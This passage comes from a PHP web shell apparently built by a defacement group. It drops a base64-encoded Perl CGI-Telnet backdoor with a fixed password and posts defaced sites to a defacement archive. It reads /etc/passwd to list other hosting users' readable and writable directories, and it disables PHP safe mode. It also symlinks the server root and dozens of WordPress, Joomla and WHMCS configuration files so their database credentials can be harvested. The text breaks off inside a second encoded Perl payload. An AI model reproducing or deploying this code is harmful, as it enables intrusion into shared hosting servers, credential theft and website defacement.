LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7DQoJfQ0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7DQoJbXkgQHBhdGhsb2c9KAknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9hcGFjaGUyL2NvbmYvaHR0cGQuY29uZicsDQoJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCScvdmFyL2xvZy9odHRwZC9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2Vycm9yX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL3N1cGhwX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbGljZW5zZV9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbG9naW5fbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL3N0YXRzX2xvZycsDQoJCQknL3Zhci9jcGFuZWwvY3BhbmVsLmNvbmZpZycsDQoJCQknL3Vzci9sb2NhbC9waHAvbGliL3BocC5pbmknLA0KCQkJJy91c3IvbG9jYWwvcGhwNS9saWIvcGhwLmluaScsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtYmluLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwubG9nJywNCgkJCScvdmFyL2xvZy9teXNxbGRlcnJvci5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtc2xvdy5sb2cnLA0KCQkJJy92YXIvbXlzcWwubG9nJywNCgkJCScvdmFyL2xpYi9teXNxbC9teS5jbmYnLA0KCQkJJy9ldGMvbXlzcWwvbXkuY25mJywNCgkJCScvZXRjL215LmNuZicsDQoJCQkpOw0KCW15ICRpPTA7DQoJbXkgJHBlcm1zOw0KCW15ICRzbDsNCglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQ0KCXsNCgkJaWYoLXIgJGxvZykNCgkJew0KCQkJJHBlcm1zPSJPSyI7DQoJCX1lbHNlDQoJCXsNCgkJCSRwZXJtcz0iPGZvbnQgc3R5bGU9J2NvbG9yOiByZWQ7Jz5DYW5jZWw8Zm9udD4iOw0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBvblN1Ym1pdD0iRW5jb2RlcignbG9nJGknKSI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIGlkPSJsb2ckaSIgbmFtZT0iYyIgdmFsdWU9InRhaWwgLTEwMDAwICRsb2cgfCBncmVwICcvaG9tZSciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciIgLz4NCgkJCTwvZm9ybT4NCgkJCTx0ZD4kcGVybXM8L3RkPg0KDQoJCTwvdHI+DQpFTkQNCgkJJGkrKzsNCgl9DQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gZGVjb2RlX2Jhc2U2NCgkaW57J2MnfSk7DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KDQokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKGRlY29kZV9iYXNlNjQodHJpbSgkaW57J2QnfSkpKTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob21wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcigiZCIpOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCRjaG1vZCBuZSAwKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJaWYoY2htb2QoJGNobW9kLCRmaWxlKSkNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCRyZW5hbWUgbmUgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfWVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjbGllbnRwb3J0Iik7DQoJcHJpbnQgJkJhY2tCaW5kOw0KfWVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7';

		$file = fopen("cgi4e.izo" ,"w+");
		$write = fwrite ($file ,base64_decode($cgi4e));
		fclose($file);
		chmod("cgi4e.izo",0755);
		echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>CGI-Telnet Version 1.4 </span><br><font face='Tahoma' color='#007700' size='2pt'>Password : BTM</font><center><br><iframe src=cgi4e/cgi4e.izo width=75% height=60% frameborder=0></iframe>
		 
		</div></center>"; 	
	}
elseif($_GET['do'] == 'defid') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=defid'>Defacer-ID</a> </li>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "</ul>";
echo "</center>";	
if($_POST['kutang']) {
$site = explode("\r\n", $_POST['sites']);
$kutang = $_POST['kutang'];
$cawet = $_POST['cawet'];
$sempak = $_POST['sempak'];
echo "Defacer Archive: <a href='https://www.defacer.id/hacker/$cawet.html' target='_blank'>https://www.defacer.id/hacker/$cawet.html</a><br><br>";
if($kutang) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$cawet";
$data_to_post['team'] = "$sempak";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);

}
}	
}
else {
	echo"<center>
	<font style='text-decoration: underline;'>Defacer-ID Poster :</font><br>
	<form method='post' action='' >
	<br><input type='text' name='cawet' value='Jingklong'>
	<br><input type='text' name='sempak' value='BAHARI TROUBLE MAKER'>
	<br>
	<textarea style='width: 450px; height: 150px;' name='sites'></textarea>
	<br>
	<br>
	<input type='submit'  name='kutang' value='POST!'>
	</form>
	</center>";
	}	
}
elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";	
} 
elseif($_GET['do'] == 'indi') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=config2'>2nd Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=indi'>INDISHELL</a> </li>";	
echo "<li> <a href='?dir=$dir&do=vgrab'>VHosts Grabber</a> </li>";
echo "</ul>";
echo "</center>";
				$byphp = "safe_mode = Off
						disable_functions = None
						";
		file_put_contents("php.ini",$byphp);
		 
		echo '<CENTER><b>Configuration Killer By Team INDISHELL</b><br><br>';
		?>
		 
		<bR><form method=post>
				<textarea style='width: 543px; height: 420px;' name=user><?php  $users=file("/etc/passwd");
		foreach($users as $user)
		{
		$str=explode(":",$user);
		echo $str[0]."\n";
		}
		 
		?></textarea><br>
				<input type=submit name=su value="Lets Start" /></form></CENTER>
		<center>
				<?php
				error_reporting(0);
				echo "<font color=#ff00 size=2 face=\"comic sans ms\">";
				if(isset($_POST['su']))
				{
				mkdir('lol',0777);
		$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
		$g = fopen('lol/.htaccess','w');
		fwrite($g,$rr);
		$indishell = symlink("/","lol/root");
							$rt="<a href=lol/root target='_blank'><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
				echo "Please check link given below for / folder symlink <br><u>$rt</u>";
					   
						$dir=mkdir('BTM',0777);
						$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
				$f = fopen('INJECTION/.htaccess','w');
		   
				fwrite($f,$r);
				$consym="<a href=BTM/ target='_blank'><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
				echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=white size=2 face=\"comic sans ms\">$consym<br><br></font></u>";
			   
						$usr=explode("\n",$_POST['user']);
				$configuration=array("wp-config.php",
						"wordpress/wp-config.php",
						"web/wp-config.php",
						"wp/wp-config.php",
						"press/wp-config.php",
						"wordpress/beta/wp-config.php",
						"news/wp-config.php",
						"new/wp-config.php",
						"blogs/wp-config.php",
						"home/wp-config.php",
						"blog/wp-config.php",
						"protal/wp-config.php",
						"site/wp-config.php",
						"main/wp-config.php",
						"test/wp-config.php",
						"wp/beta/wp-config.php",
						"beta/wp-config.php",
						"joomla/configuration.php",
						"protal/configuration.php",
						"joo/configuration.php",
						"cms/configuration.php",
						"site/configuration.php",
						"main/configuration.php",
						"news/configuration.php",
						"new/configuration.php",
						"home/configuration.php",
						"configuration.php",
						"SSI.php",
						"forum/SSI.php",
						"forum/inc/config.php",
						"forum/includes/config.php",
						"upload/includes/config.php",
						"cc/includes/config.php",
						"vb/includes/config.php",
						"vb3/includes/config.php",
						"cpanel/configuration.php",
						"panel/configuration.php",
						"ubmitticket.php",
						"manage/configuration.php",
						"myshop/configuration.php",
						"beta/configuration.php",
						"includes/config.php",
						"lib/config.php",
						"conf_global.php",
						"inc/config.php",
						"incl/config.php",
						"include/db.php",
						"include/config.php",
						"includes/functions.php",
						"includes/dist-configure.php",
						"connect.php",
						"mk_conf.php",
						"config/koneksi.php",
						"system/sistem.php",
						"config.php",
						"Settings.php",
						"settings.php",
						"sites/default/settings.php",
						"smf/Settings.php",
						"forum/Settings.php",
						"forums/Settings.php",
						"host/configuration.php",
						"hosting/configuration.php",
						"hosts/configuration.php",
						"zencart/includes/dist-configure.php",
						"shop/includes/dist-configure.php",
						"whm/configuration.php",
						"whmc/configuration.php",
						"whmcs/configuration.php",
						"whmc/WHM/configuration.php",
						"whm/WHMCS/configuration.php",
						"whm/whmcs/configuration.php",
						"order/configuration.php",
						"support/configuration.php",
						"supports/configuration.php",
						"oscommerce/includes/configure.php",
						"oscommerces/includes/configure.php",
						"shopping/includes/configure.php",
						"sale/includes/configure.php",
						"config.inc.php",
						"amember/config.inc.php",
						"clients/configuration.php",
						"client/configuration.php",
						"clientes/configuration.php",
						"cliente/configuration.php",
						"clientsupport/configuration.php",
						"billing/configuration.php",
						"billings/configuration.php",
						"admin/conf.php",
						"admin/config.php");
						foreach($usr as $uss )
						{
								$us=trim($uss);
													   
								foreach($configuration as $c)
								{
								 $rs="/home/".$us."/public_html/".$c;
								 $r="BTM/".$us." .. ".$c;
								 symlink($rs,$r);
							   
						}
							   
								}
					   
					   
						}
			
} 
elseif($_GET['do'] == 'tconf') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=config2'>2nd Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=indi'>INDISHELL</a> </li>";	
echo "<li> <a href='?dir=$dir&do=vgrab'>VHosts Grabber</a> </li>";
echo "</ul>";
echo "</center>";
}
elseif($_GET['do'] == 'vgrab') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=config2'>2nd Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=indi'>INDISHELL</a> </li>";	
echo "<li> <a href='?dir=$dir&do=vgrab'>VHosts Grabber</a> </li>";
echo "</ul>";
echo "</center>";

echo"<br><center><form method='post'>
<input type='submit' name='elgass' value='Click Here'>
</form></center>";

if (isset($_POST['elgass']))
{
@mkdir('btbt', 0755);
@chdir('btbt');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$btm = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxubiI7DQpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjwvaGVhZD4NCic7DQoNCg0KcHJpbnQgJw0KPGJvZHk+DQo8cD4uOiBDb2RlZCBieSBGYWxsYWcgR2Fzc3Jpbmk8L3A+DQonOw0Kb3BlbmRpcihteSAkZGlyICwgIi92YXIvd3d3L3Zob3N0cy8iKTsNCmZvcmVhY2goc29ydCByZWFkZGlyICRkaXIpIHsNCiAgICBteSAkaXNEaXIgPSAwOw0KICAgICRpc0RpciA9IDEgaWYgLWQgJF87DQokc2l0ZXNzID0gJF87DQoNCg0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLW9zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1zaG9wcGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zYWxlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5pbmMucGhwJywkc2l0ZXNzLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLW1lbWJlcnMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1mb3J1bS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtcy50eHQnKTsNCnN5bWx